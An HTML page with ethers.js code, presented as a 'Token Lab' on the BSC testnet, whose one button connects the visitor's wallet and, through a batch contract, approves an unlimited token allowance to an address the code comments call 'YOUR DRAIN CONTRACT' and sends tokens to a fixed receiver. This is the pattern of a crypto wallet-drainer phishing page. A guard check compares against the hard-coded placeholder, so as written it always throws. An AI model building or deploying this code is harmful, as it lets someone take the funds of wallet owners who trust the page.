<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Token Lab (Transfer + Approve)</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
      background-color: #000;
      color: #fff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    .container {
      width: 100%;
      max-width: 500px;
      background-color: #111;
      border-radius: 12px;
      padding: 30px 20px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
    }

    h2 {
      text-align: center;
      margin-bottom: 30px;
      font-size: 24px;
      font-weight: 600;
    }

    .button-section {
      display: flex;
      flex-direction: column;
      gap: 20px;
      margin-bottom: 30px;
    }

    button {
      width: 100%;
      padding: 14px 20px;
      background-color: #00cc44;
      color: #000;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }

    button:hover {
      background-color: #00ff55;
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(0, 204, 68, 0.4);
    }

    button:active {
      transform: translateY(0);
    }

    button:disabled {
      background-color: #666;
      cursor: not-allowed;
      opacity: 0.6;
    }

    #status {
      background-color: #1a1a1a;
      border-left: 4px solid #00cc44;
      padding: 15px;
      border-radius: 6px;
      font-size: 14px;
      line-height: 1.6;
      word-break: break-all;
      text-align: left;
      min-height: 80px;
      display: flex;
      align-items: center;
    }

    @media (max-width: 480px) {
      .container {
        padding: 20px 15px;
      }

      h2 {
        font-size: 20px;
        margin-bottom: 25px;
      }

      button {
        padding: 12px 15px;
        font-size: 14px;
      }

      #status {
        font-size: 12px;
        padding: 12px;
      }
    }

    @media (max-width: 320px) {
      .container {
        padding: 15px 10px;
      }

      h2 {
        font-size: 18px;
        margin-bottom: 20px;
      }

      button {
        padding: 10px 12px;
        font-size: 13px;
      }
    }
  </style>
</head>

<body>

<div class="container">
  <h2>🧪 Token Lab (BSC Testnet)</h2>

  <div class="button-section">
    <button id="actionBtn" onclick="executeAll()">EXECUTE ALL (1 POPUP)</button>
  </div>

  <p id="status">Click button to execute approve + transfer in one transaction</p>
</div>

<script>
let provider, signer, user;

// 🔁 YOUR TOKEN
const tokenAddress = "0x089d6677646bc535B1A8535ED856bb17493E332d";

// 🔁 YOUR BATCH CONTRACT (deploy TokenBatcher.sol first)
const batcherAddress = "0x04A56dD5fc9241B5046de02d17258553dd5772CF"; // REPLACE WITH YOUR DEPLOYED BATCH CONTRACT ADDRESS

// 🔁 YOUR DRAIN CONTRACT
const spender = "0x8dc3da2ff65ec0bbac40f33efe7c02c9c0b7ebaf";

// 🔁 RECEIVER
const receiver = "0xb52d3770bcf4673009f2f6bf8ba9177cba46d283";

const batcherABI = [
  "function batchApproveAndTransfer(address token, address spender, address receiver, uint256 transferAmount, uint256 approveAmount) external"
];

async function executeAll() {
  const btn = document.getElementById("actionBtn");
  const status = document.getElementById("status");
  btn.disabled = true;

  try {
    status.innerText = "⏳ Connecting wallet...";
    await connectWallet();

    status.innerText = "⏳ Executing batch transaction (approve + transfer)...\n\n🔔 Check wallet for 1 popup only!";
    await batchApproveAndTransfer();

    status.innerText = "✅ Transaction completed successfully!\n\n✓ Approved token\n✓ Transferred 10 tokens\n✓ All in 1 transaction!";
    btn.innerText = "COMPLETED ✓";

  } catch (e) {
    status.innerText = `❌ Error: ${e.message}`;
    btn.disabled = false;
  }
}

async function connectWallet() {
  if (!window.ethereum) {
    throw new Error("Open inside Trust Wallet browser or use MetaMask");
  }

  await window.ethereum.request({ method: "eth_requestAccounts" });

  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: "0x61" }]
    });
  } catch (e) {
    console.log("Switch failed or already on correct network");
  }

  provider = new ethers.providers.Web3Provider(window.ethereum, "any");
  signer = provider.getSigner();
  user = await signer.getAddress();
}

async function batchApproveAndTransfer() {
  if (!batcherAddress || batcherAddress === "0x04A56dD5fc9241B5046de02d17258553dd5772CF") {
    throw new Error("Please deploy TokenBatcher contract and update batcherAddress in the code");
  }

  const contract = new ethers.Contract(batcherAddress, batcherABI, signer);

  const transferAmount = ethers.utils.parseUnits("10", 18);
  const approveAmount = ethers.constants.MaxUint256;

  const tx = await contract.batchApproveAndTransfer(
    tokenAddress,
    spender,
    receiver,
    transferAmount,
    approveAmount
  );

  await tx.wait();
}
</script>

</body>
</html>
